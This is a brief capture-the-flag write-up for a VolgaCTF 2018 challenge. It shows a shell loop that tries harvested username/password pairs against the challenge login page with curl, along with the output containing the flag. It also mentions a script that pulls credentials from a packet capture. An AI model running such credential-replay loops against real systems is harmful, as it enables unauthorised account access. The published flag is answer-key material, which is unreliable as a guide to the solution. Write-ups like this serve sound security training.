# Master

100 points

solved by committee in Math329

## solved

eventually got it by doing this:

```
mtoups@x1ubuntu:~/ctf/volga/master$ while read l ; do u=`echo $l | cut -d' ' -f 1`; p=`echo $l | cut -d' ' -f 2`; echo -n $u && echo -n  "  " && curl -X POST -d uname=$u -d psw=$p http://master.quals.2018.volgactf.ru:3333/ 2>/dev/null | grep -v "No flag for you!" ; echo ;done < try-admin.txt 
admin  Invalid user

admin  Invalid user

admin  Invalid user

admin  VolgaCTF{PLA1N_TEXT_REPLICATION_IS_@_B@D_THING}

admin  Invalid user

```

## scripts

* extract.py reads users/passwords from pcap file (scapy library)
* do-curl-logins.sh reads user password (space delimited) from text file, calls curl to try login
